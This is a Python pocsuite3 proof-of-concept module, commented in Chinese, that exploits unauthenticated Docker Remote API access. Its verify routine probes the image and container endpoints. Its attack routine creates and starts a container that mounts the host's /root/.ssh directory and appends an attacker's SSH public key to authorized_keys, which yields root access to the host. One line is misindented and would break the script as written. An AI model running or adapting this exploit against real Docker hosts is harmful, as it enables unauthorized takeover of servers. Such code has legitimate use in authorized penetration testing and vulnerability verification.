#!/usr/bin/env python
#coding=utf-8
import traceback

import socket
# 将输入的url转换为ip:port，供socket使用
from pocsuite3.lib.utils import url2ip
from pocsuite3.api import requests as req
from pocsuite3.api import logger
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class Docker_remote_api_POC(POCBase):
    vulID = 'Docker-remote-api-unauthorized-access'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    appName = 'Docker'
    appVersion = ''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.INFORMATION_DISCLOSURE

    vulDate = '2020-04-27'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-04-27'  # 编写 PoC 的日期
    updateDate = '2020-04-27'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://docs.docker.com/engine/api/v1.24/', 'https://p0sec.net/index.php/archives/115/']  # 漏洞地址来源,0day不用写
    name = 'Docker Remote API未授权访问漏洞'  # PoC 名称
    cvss = u"高危"


    def _verify(self):
        result={}

        vul_url = self.url
        host, port = url2ip(vul_url, True)

        logger.info("检查端口开放情况...")
        # 端口都不开放就不浪费时间了
        if not self.is_port_open(host, port):
            logger.info("端口不开放! 退出!")
            return

        logger.info("端口开放... 继续") 
        target_url = vul_url


        # 列出docker下的images
        IMAGES_PATH = '/images/json'
        IMAGES_URL =  vul_url + IMAGES_PATH

        # 列出docker下的containers
        CONS_PATH = '/containers/json'
        CONS_URL =  vul_url + CONS_PATH


        try:
            proxies = {'http': 'http://127.0.0.1:8087'}
            resp1 = req.get(IMAGES_URL, timeout=5)
            resp2 = req.get(CONS_URL, timeout=5)

            # 响应200，且响应头里Server为：`Server: Docker/18.09.7 (linux)`之类的
            if resp1.status_code == 200 and 'docker' in resp1.headers['Server'].lower():
                if resp2.status_code == 200 and 'docker' in resp2.headers['Server'].lower():
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = target_url
                    result['VerifyInfo']['Payload1'] = IMAGES_URL
                    result['VerifyInfo']['Payload2'] = CONS_URL
                    return self.save_output(result)

            return self.save_output(result)
        except Exception as e:
            print(e)
            traceback.print_stack()
        
        return self.save_output(result)


    #漏洞攻击
    def _attack(self):
        result={}

        vul_url = self.url
        target_url = vul_url


        # 列出docker下的images
        IMAGES_PATH = '/images/json'
        IMAGES_URL =  vul_url + IMAGES_PATH

        # 根据已有的image创建containers
        CONS_PATH = '/containers/create'
        CONS_URL =  vul_url + CONS_PATH


        # 受害者上可用的image
        img_avai = ''

        resp1 = req.get(IMAGES_URL, timeout=5)

        if resp1.status_code == 200:
            resp1_json = resp1.json()
            print(resp1_json)
            img_avai = resp1_json[0]['RepoTags']  # 这是一个数组形式

        print("可用的image为: " + str(img_avai))

        img_to_create = ''
        # 从可用的images中找出ubuntu或者centos，用于下一步创建container
        for img in img_avai:
            if "ubuntu" in img.lower() or "centos" in img.lower():
                img_to_create = img


		DEMO_PUBLIC_KEY = ""
        # 将攻击者的公钥添加到/tmp/authorized_keys文件中，然后创建containers的过程中，将/root/.ssh目录映射到/tmp，间接将攻击者
        # 注意这里执行的命令是在docker里面的，所以想要用宿主机的命令，需要通过间接的写公钥的方式。
        payload_j = { "Cmd": [ "/bin/sh", "-c", "echo  {0} >> /tmp/authorized_keys".format(DEMO_PUBLIC_KEY) ], 
                        "Image": img_to_create, "Volumes": { "/tmp": {} }, 
                        "HostConfig": { "Binds": ["/root/.ssh:/tmp:rw"] } 
                    }

        try:
            proxies = {'http': 'http://127.0.0.1:8087'}
            resp2 = req.post(CONS_URL, json=payload_j, timeout=5)

            # 响应成功 : `201 Created`          
            if resp2.status_code == 201 and 'docker' in resp2.headers['Server'].lower():
                print("[*] create 成功！")
                CONT_ID = resp2.json()["Id"]
                print(CONT_ID)

                # 创建之后的container并不会自动start，需要再发送一个请求，才能启动
                CONS_START_PATH = '/containers/{0}/start'.format(CONT_ID)
                CONS_START_URL = vul_url + CONS_START_PATH

                resp3 = req.post(CONS_START_URL, timeout=5)
                if resp3.status_code == 204:
                    print("[*] start 成功！")
        except Exception as e:
            print(e)
            traceback.print_stack()
        
        return self.save_output(result)


    def is_port_open(self, p_host, p_port):
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(2)
        try:
            sk.connect((p_host, p_port))
            print('Server port is OK!')
        except Exception as e:    # 碰到异常认为端口未开放，返回False
            return False
        
        sk.close()
        # 没问题就返回True
        return True


    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register_poc(Docker_remote_api_POC)
